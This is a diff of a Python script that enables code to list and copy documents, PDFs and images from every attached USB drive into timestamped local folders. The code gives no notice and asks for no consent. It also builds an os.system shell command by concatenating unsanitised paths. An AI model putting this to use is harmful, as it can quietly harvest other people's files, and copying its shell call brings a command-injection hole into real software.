@@ -47,10 +47,10 @@ def run_cmd(cmd):
 # def copy_compressed_file():
 #
 #
-# def copy_file_tree(udisk, computer):
-#     cmd = 'tree ' + udisk + ' /f > ' + computer + '\\copy_file_tree.txt'
-#     os.system(cmd)
-#
+def copy_file_tree(udisk, computer):
+    cmd = 'tree ' + udisk + ' /f > ' + computer + '\\copy_file_tree.txt'
+    os.system(cmd)
+
 # def copy_other()
 
 
@@ -59,9 +59,7 @@ def copy_file(udisk, computer):
     for root, dirs, files in list_files:
         for file in files: # .rar .zip .gif .bmp
             if file.endswith(('.xlsx', '.xls', '.ppt', '.pptx', '.pdf', '.png', '.jpg', '.txt', '.doc', '.docx')):
-                # if file.endswith(('.jpg')):
                 shutil.copyfile(os.path.join(root, file), os.path.join(computer, file))
-
 
 
 if __name__ == "__main__":
@@ -69,11 +67,11 @@ if __name__ == "__main__":
     udisk_path = get_udisk_path()
     get_udisk_info_by_path(udisk_path)
 
-    # for udisk in udisks:
-    #     computer = keep_path + datetime.datetime.now().strftime("%Y-%m-%d--%H-%M")
-    #     if not os.path.exists(computer):
-    #         os.makedirs(computer)
-    #     # copy_file_tree(udisk, computer)
-    #     time.sleep(3)
-    #     # copy_file(udisk, computer)
-    #     # time.sleep(10)
+    for udisk in udisk_path:
+        computer = keep_path + datetime.datetime.now().strftime("%Y-%m-%d--%H-%M")
+        if not os.path.exists(computer):
+            os.makedirs(computer)
+        copy_file_tree(udisk, computer)
+        time.sleep(3)
+        copy_file(udisk, computer)
+        time.sleep(10)
